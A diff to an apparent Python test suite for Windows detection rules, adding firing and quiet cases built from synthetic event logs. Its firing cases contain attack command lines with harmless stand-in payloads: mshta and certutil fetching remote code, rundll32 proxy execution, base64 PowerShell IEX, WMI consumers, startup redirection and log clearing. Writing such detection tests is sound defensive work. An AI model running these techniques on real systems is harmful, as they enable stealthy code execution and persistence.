@@ -48,6 +48,21 @@ def security(event_id):
     return Event(event_id, T0, "SRV-APP-02.corp.example", "Security", {"SubjectUserName": "adm-rpatel"})
 
 
+def system(event_id, provider, **data):
+    return Event(event_id, T0, "SRV-APP-02.corp.example", "System", data, meta={"provider": provider})
+
+
+def wmi_consumer(operation, kind, destination):
+    return Event(20, T0, "WKSTN-07.corp.example", SYSMON_CHANNEL,
+                 {"EventType": "WmiConsumerEvent", "Operation": operation, "User": "CORP\\kchen",
+                  "Name": ' "Updater"', "Type": kind, "Destination": f' "{destination}"'})
+
+
+USER_SHELL_FOLDERS = "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\"
+RUNDLL32 = SYS32 + "rundll32.exe"
+MSHTA = SYS32 + "mshta.exe"
+WSCRIPT = SYS32 + "wscript.exe"
+
 FIRE, QUIET = True, False
 
 CASES = {
@@ -82,6 +97,7 @@ CASES = {
     "net_proxy_binary_public_destination": [
         (FIRE, net(SYS32 + "rundll32.exe", "198.51.100.40")),
         (FIRE, net(SYS32 + "regsvr32.exe", "203.0.113.9")),
+        (FIRE, net(SYS32 + "wbem\\WMIC.exe", "192.0.2.80")),  # wmic /format:https://... fetching an XSL
         (QUIET, net(SYS32 + "rundll32.exe", "192.168.1.20")),
         (QUIET, net(SYS32 + "svchost.exe", "198.51.100.40")),
     ],
@@ -117,9 +133,13 @@ CASES = {
         (QUIET, proc(SYS32 + "rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl")),
     ],
     "proc_script_host_runs_user_script": [
-        (FIRE, proc(SYS32 + "wscript.exe", '"C:\\Windows\\System32\\WScript.exe" "C:\\Users\\kchen\\Downloads\\invoice_1234.js"')),
-        (QUIET, proc(SYS32 + "wscript.exe", "wscript.exe \\\\corp.example\\NETLOGON\\map-drives.vbs")),
+        (FIRE, proc(WSCRIPT, '"C:\\Windows\\System32\\WScript.exe" "C:\\Users\\kchen\\Downloads\\invoice_1234.js"')),
+        (FIRE, proc(WSCRIPT, '"C:\\Windows\\System32\\WScript.exe" "C:\\Users\\kchen\\AppData\\Local\\Microsoft\\'
+                             'Windows\\INetCache\\IE\\X1Y2Z3\\update.vbs"')),  # VBScript from the browser cache
+        (FIRE, proc(WSCRIPT, "wscript.exe /E:vbs C:\\Windows\\Temp\\icon.ico")),  # a script posing as an icon
+        (QUIET, proc(WSCRIPT, "wscript.exe \\\\corp.example\\NETLOGON\\map-drives.vbs")),
         (QUIET, proc(SYS32 + "cscript.exe", "cscript.exe C:\\Windows\\System32\\slmgr.vbs /dli")),
+        (QUIET, proc(WSCRIPT, "wscript.exe C:\\Users\\kchen\\Desktop\\notes.txt")),  # not a script
     ],
     "proc_script_host_spawns_lolbin": [
         (FIRE, proc(SYS32 + "certutil.exe", "certutil -urlcache -f http://x", parent=SYS32 + "wscript.exe",
@@ -174,9 +194,53 @@ CASES = {
         (QUIET, proc(PS, "powershell -c Get-MpPreference")),
     ],
     "proc_mshta_remote_or_inline": [
-        (FIRE, proc(SYS32 + "mshta.exe", "mshta.exe http://198.51.100.7/a.hta")),
-        (FIRE, proc(SYS32 + "mshta.exe", "mshta.exe vbscript:Close(Execute(\"x\"))")),
-        (QUIET, proc(SYS32 + "mshta.exe", "mshta.exe C:\\Program Files\\Vendor\\setup.hta")),
+        (FIRE, proc(MSHTA, "mshta.exe http://198.51.100.7/a.hta")),
+        (FIRE, proc(MSHTA, "mshta.exe vbscript:Close(Execute(\"x\"))")),
+        (QUIET, proc(MSHTA, "mshta.exe C:\\Program Files\\Vendor\\setup.hta")),
+    ],
+    # --- added in phase 7, after the public recordings (docs/phase-7-real-data.md) ---
+    "proc_mshta_local_hta_or_dcom": [
+        (FIRE, proc(MSHTA, '"C:\\Windows\\SysWOW64\\mshta.exe" "C:\\Users\\Public\\viewer.hta"')),
+        (FIRE, proc(MSHTA, '"C:\\Windows\\System32\\mshta.exe" "C:\\Users\\kchen\\AppData\\Local\\Microsoft\\'
+                           'Windows\\INetCache\\IE\\X1Y2Z3\\update.hta"', parent="C:\\Program Files\\Internet "
+                           "Explorer\\iexplore.exe")),
+        (FIRE, proc(MSHTA, "C:\\Windows\\System32\\mshta.exe -Embedding", parent=SYS32 + "svchost.exe")),
+        (QUIET, proc(MSHTA, "mshta.exe C:\\Program Files\\Vendor\\setup.hta")),
+        (QUIET, proc(SYS32 + "notepad.exe", "notepad.exe C:\\Users\\Public\\viewer.hta")),  # just looking at it
+    ],
+    "proc_rundll32_proxy_execution": [
+        (FIRE, proc(RUNDLL32, "rundll32.exe zipfldr.dll,RouteTheCall C:\\Users\\Public\\payload.exe")),
+        (FIRE, proc(RUNDLL32, "rundll32.exe advpack.dll, RegisterOCX C:\\Users\\Public\\payload.exe")),
+        (FIRE, proc(RUNDLL32, "rundll32.exe pcwutl.dll,LaunchApplication C:\\Users\\Public\\payload.exe")),
+        (FIRE, proc(RUNDLL32, 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)')),
+        (QUIET, proc(RUNDLL32, "rundll32.exe shell32.dll,Control_RunDLL desk.cpl")),
+        (QUIET, proc(RUNDLL32, "rundll32.exe printui.dll,PrintUIEntry /il")),
+    ],
+    "proc_powershell_base64_inline": [
+        (FIRE, proc(PS, "powershell.exe -nop -c IEX([Text.Encoding]::UTF8.GetString([Convert]::"
+                        "FromBase64String('V3JpdGUtT3V0cHV0IDE=')))")),
+        (FIRE, proc(PS, "powershell.exe -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object "
+                        "IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sI'"
+                        "))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))")),
+        (QUIET, proc(PS, "powershell.exe -c [Convert]::FromBase64String($cert) | Set-Content -Encoding Byte c.cer")),
+        (QUIET, proc(PS, "powershell.exe -c IEX (Get-Content C:\\Scripts\\setup.ps1 -Raw)")),
+    ],
+    "sys_event_log_cleared": [
+        (FIRE, system(104, "Microsoft-Windows-Eventlog", SubjectUserName="kchen", Channel="System")),
+        (QUIET, system(104, "Contoso-Backup-Agent", Message="job 104 finished")),  # another program's event 104
+        (QUIET, system(7036, "Service Control Manager", param1="Windows Event Log", param2="running")),
+    ],
+    "reg_startup_folder_redirected": [
+        (FIRE, reg(SYS32 + "reg.exe", USER_SHELL_FOLDERS + "Startup", "C:\\ProgramData\\Updates")),
+        (QUIET, reg(EXPLORER, USER_SHELL_FOLDERS + "Startup",
+                    "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")),
+        (QUIET, reg(EXPLORER, USER_SHELL_FOLDERS + "Personal", "C:\\Users\\kchen\\OneDrive\\Documents")),
+    ],
+    "wmi_event_consumer_created": [
+        (FIRE, wmi_consumer("Created", "Command Line", "C:\\Windows\\System32\\cmd.exe /c C:\\Users\\Public\\u.bat")),
+        (FIRE, wmi_consumer("Modified", "Script", "var s = new ActiveXObject('WScript.Shell');")),
+        (QUIET, wmi_consumer("Deleted", "Command Line", "C:\\Windows\\System32\\cmd.exe")),  # cleaning up
+        (QUIET, wmi_consumer("Created", "Log File", "C:\\Windows\\Temp\\wmi.log")),
     ],
 }
 
